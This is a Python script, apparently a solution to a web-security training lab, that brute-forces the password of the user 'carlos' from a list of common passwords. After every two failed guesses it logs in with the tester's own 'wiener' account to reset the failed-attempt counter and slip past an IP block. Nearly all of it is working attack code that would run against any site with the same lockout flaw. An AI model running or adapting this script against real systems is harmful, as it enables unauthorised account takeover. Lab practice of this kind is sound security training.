import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

password=['123456\n', 'password\n', '12345678\n', 'qwerty\n', '123456789\n', '12345\n', '1234\n', '111111\n',
'1234567\n', 'dragon\n', '123123\n', 'baseball\n', 'abc123\n', 'monkey\n', 'letmein\n', 
'shadow\n', 'master\n', '666666\n', 'qwertyuiop\n', '123321\n', 'mustang\n', '1234567890\n', 'michael\n', 
'654321\n', 'superman\n', '1qaz2wsx\n', '7777777\n', '121212\n', '000000\n', 'qazwsx\n', '123qwe\n', 
'killer\n', 'trustno1\n', 'jordan\n', 'jennifer\n', 'zxcvbnm\n', 'asdfgh\n', 'hunter\n', 'buster\n', 
'soccer\n', 'harley\n', 'batman\n', 'andrew\n', 'tigger\n', 'sunshine\n', 'iloveyou\n', '2000\n',
'charlie\n', 'robert\n', 'thomas\n', 'hockey\n', 'ranger\n', 'daniel\n', 'starwars\n', 'klaster\n', 
'112233\n', 'george\n', 'computer\n', 'michelle\n', 'jessica\n', 'pepper\n', '1111\n', 'zxcvbn\n',
'555555\n', '11111111\n', '131313\n', 'freedom\n', '777777\n', 'pass\n', 'maggie\n', '159753\n', 
'aaaaaa\n', 'ginger\n' ,'football\n','princess\n', 'joshua\n', 'cheese\n', 'amanda\n', 'summer\n', 'love\n', 
'ashley\n', 'nicole\n', 'chelsea\n', 'biteme\n', 'matthew\n', 'access\n', 'yankees\n', '987654321\n', 'dallas\n',
'austin\n', 'thunder\n', 'taylor\n', 'matrix\n', 'mobilemail\n', 'mom\n', 'monitor\n', 'monitoring\n', 
'montana\n', 'moon\n', 'moscow']

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
def login(session,url):
     #Your credentials: wiener:peter
    print('(+) Brute Froce password .....')
    url_log=url+"/login"
    data={"username":"wiener","password":"peter"}
    response=session.post(url_log,verify=False,data=data)
    if "Log out" in response.text:
        print('(+) Log in to wiener acount')
        logout_response=session.get(url+"/logout",verify=False)
        if "Log out" not in logout_response.text:
            print('(+) Log out from wiener acount ')

def brute_protection(session,url):

    #Lab: Broken brute-force protection, IP block
    #Victim's username: carlos
    # 3 false attempte log in block for 1 min
    # 2 attempte log in & 1 corecte log in to brute force with out block 
    count=1
    url_log=url+"/login"
    
    for ps in password:
        
        data={"username":"carlos","password":ps.strip()}
        
        if count==1 or count==2:
            print('(+) Trying two password ..')
            print(data)
            response=session.post(url_log,data=data,verify=False,proxies=proxie)
            
            count+=1
            if "Log out" in response.text:
                print('\n|-----------------FOUND------------------|')
                print('| Password Found : %s'%ps.strip())
                print('| Log in seccessfully !')
                print('|----------------------------------------|')
                exit(-1)
            
        elif count==3:
            
            login(session,url)
            count=1
        else:
            print("(-) Error")
            exit(-1)
            



def main():
   
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)
    
    session=requests.session()
    url=sys.argv[1]
    login(session,url)
    brute_protection(session,url)


if __name__=="__main__":
    main()